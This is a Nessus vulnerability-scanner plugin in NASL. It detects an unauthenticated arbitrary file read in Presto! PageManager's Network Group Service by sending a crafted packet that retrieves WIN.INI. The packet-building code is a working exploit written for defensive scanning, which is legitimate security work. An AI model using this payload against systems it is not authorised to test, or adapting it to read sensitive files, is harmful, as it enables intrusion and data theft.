#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59114);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2017/02/08 22:04:50 $");

  script_bugtraq_id(52503);
  script_osvdb_id(80130);
  script_xref(name:"EDB-ID", value:"18600");
  
  script_name(english:"Presto! PageManager Network Group Service Packet Network Request Parsing Arbitrary File Access");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be read on the remote host.");

  script_set_attribute(attribute:"description", value:
"The installation of Presto! PageManager on the remote host is bundled
with a file transfer service referred to as 'NetGroup' or 'Network
Group Service' that allows an unauthenticated, remote attacker to
retrieve the contents of arbitrary files on the affected host. 

Note that this service is also likely affected by denial of service
(DoS) and heap-overflow vulnerabilities, although Nessus has not
checked for them.");
  script_set_attribute(attribute:"see_also", value:"http://aluigi.org/adv/pagemanager_1-adv.txt");
  script_set_attribute(attribute:"solution", value:
"As of this writing, no fix has been released.  Until one has been
released, you should either disable the 'Network Group Service' or
limit access to it with a firewall.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/03/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/05/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:newsoftinc:presto%21_pagemanager");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Windows");

  script_copyright(english:"This script is Copyright (C) 2012-2017 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl");
  script_require_ports(2502);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("audit.inc");

PPM_NETGROUP_PROTO = "pagemanager_netgroup";

function make_payload(path)
{
  local_var payload;

  # First 4 bytes are a magic number, next 4 bytes are recev's next buffer size
  payload = raw_string(0x00, 0x00, 0x01, 0x00, 0x15, 0x00, 0x00, 0x00);
  # Will appear in the log under "event info".
  payload += "nessus" + raw_string(0x00);
  payload += raw_string(0x66, 0x69, 0x6c, 0x65, 0x00, 0x01, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x02, 0x00, 0x00, 0x01, 0x00, 0x00);
  # The file we want to retrieve.
  payload += path + raw_string(0x00);
  # Given the size/offsets we provided, the packet must be exactly 301 bytes.
  payload += crap(
    data   : raw_string(0x00),
    length : 301 - strlen(payload) - 6
  );
  payload += raw_string(0x20, 0x00, 0x00, 0x00, 0x00, 0x00);

  return payload;
}

os = get_kb_item("Host/OS");
if (report_paranoia < 2 && "Windows" >!< os)
  audit(AUDIT_OS_NOT, "Windows");

port = 2502;
if (!get_tcp_port_state(port))
  audit(AUDIT_PORT_CLOSED, port);

existing_service = known_service(port:port);
if (!isnull(existing_service) && existing_service != PPM_NETGROUP_PROTO)
  audit(AUDIT_NOT_LISTEN, "Presto! PageManager's Network Group Service", port);

is_affected = FALSE;
# Contents of retrieved file
contents = NULL;

win_ini_paths = make_list("C:/WINDOWS/WIN.INI", "C:/WINNT/WIN.INI");
foreach win_ini_path (win_ini_paths)
{
  soc = open_sock_tcp(port);

  if (!soc) audit(AUDIT_SOCK_FAIL, port, "tcp");

  # Make and send the payload, failing if the entirety was not sent
  payload    = make_payload(path:win_ini_path);
  bytes_sent = send(socket:soc, data:payload);
  if (bytes_sent != strlen(payload))
  {
    close(soc);
    continue;
  }

  # Finally, we attempt to receive a response.
  response = recv(socket:soc, length:1024);
  close(soc);

  # 32 bytes are needed for the 8 byte header and test string
  if (strlen(response) < 32) continue;

  # We want to strip the 8 byte header.
  # Value also used in reporting.
  if ("; for 16-bit app support" >< response)
  {
    # File is null terminated and between an 8 byte header and 8 byte prologue
    contents = substr(response, 8, strlen(response) - 10);
    is_affected = TRUE;
    break;
  }
}

if (is_affected)
{
  # We now know Presto PageManager's Network Group service is running
  register_service(port:port, ipproto:"tcp", proto:PPM_NETGROUP_PROTO);

  report = NULL;
  if (report_verbosity > 0)
  {
    report = '\nNessus was able to exploit the issue to retrieve the contents of ' +
              win_ini_path + '\n';
  }
  if (report_verbosity > 1 && !isnull(contents))
  {
    report += '\n' +
        'Here are the contents :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        chomp(contents) + '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
  }
  security_hole(port:port, extra:report);
}
else exit(0, "The service listening on port "+port+" is not affected.");
